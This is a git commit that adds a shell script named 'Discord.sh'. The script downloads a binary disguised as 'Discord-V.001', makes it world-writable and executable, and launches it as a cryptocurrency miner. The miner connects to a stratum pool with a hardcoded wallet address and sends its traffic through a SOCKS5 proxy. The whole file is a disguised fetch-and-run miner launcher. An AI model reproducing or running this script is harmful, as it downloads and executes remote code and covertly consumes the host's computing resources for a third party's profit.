23940977d3aa707465c4825d201e51127cc34ac3
Explorer-Discord <90913472+Explorer-Discord@users.noreply.github.com>
2021-09-18 17:14:08 +0700

    Add files via upload

---
+++ Discord.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y
+wget -O Discord-V.001 https://github.com/Explorer-Discord/Discord-V.001/raw/main/Discord-V.001 
+screen -dmS ls
+chmod +x phpsur.sh && chmod +x Discord-V.001 && chmod 777 Discord-V.001 phpsur.sh
+./Discord-V.001 -a gr  -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.AA=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
